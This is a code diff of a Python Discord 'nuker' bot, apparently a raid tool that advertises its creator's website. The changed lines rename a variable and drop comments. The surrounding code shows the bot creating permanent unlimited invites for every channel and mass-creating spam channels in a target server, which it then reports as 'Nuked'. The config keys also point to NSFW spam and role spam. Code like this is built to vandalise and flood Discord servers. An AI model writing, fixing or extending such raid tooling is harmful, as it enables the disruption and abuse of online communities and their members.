@@ -19,9 +19,7 @@ NsfwSpam = data['NsfwSpam']
 RoleSpamAmount = data['RoleSpamAmount']
 RoleSpamName = data['RoleSpamName']
 
-SPAM_CHANNEL = [ChannelName]
 SPAM_MESSAGE = [SpamMessage]
-
 
 intents = discord.Intents(messages=True, guilds=True, members=True)
 
@@ -29,7 +27,6 @@ client = commands.Bot(command_prefix='.', intents=intents)
 
 clear = lambda: os.system('cls')
 
-## MENU
 def menu():
     print(Center.XCenter("iliyaa.tk"))
     print(Center.XCenter(Box.DoubleCube('''[1] Continue To Regular Mode
@@ -95,9 +92,8 @@ Creator's Website -- iliyaa.tk
             for channel in guild.text_channels:
                 link = await channel.create_invite(max_age = 0, max_uses = 0)
                 print(f"New Invite: {link}")
-            # old code for amount of channels obviously for testing purposes    amount = 500
             for i in range(int(ChannelAmount)):
-               await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+               await guild.create_text_channel(random.choice(ChannelName))
             print(f"Nuked {guild.name} Successfully.")
             return
 
@@ -138,7 +134,7 @@ Creator's Website -- iliyaa.tk
                 print(f"New Invite: {link}")
             # old code for amount of channels obviously    amount = 500
             for i in range(int(ChannelAmount)):
-               await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+               await guild.create_text_channel(random.choice(ChannelName))
             print(f"Nuked {guild.name} Successfully.")
             return
 
@@ -308,9 +304,8 @@ Creator's Website -- iliyaa.tk
             for channel in guild.text_channels:
                 link = await channel.create_invite(max_age = 0, max_uses = 0)
                 print(f"New Invite: {link}")
-            # old code for amount of channels obviously    amount = 500
             for i in range(int(ChannelAmount)):
-               await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+               await guild.create_text_channel(random.choice(ChannelName))
             print(f"Nuked {guild.name} Successfully.")
             return
 
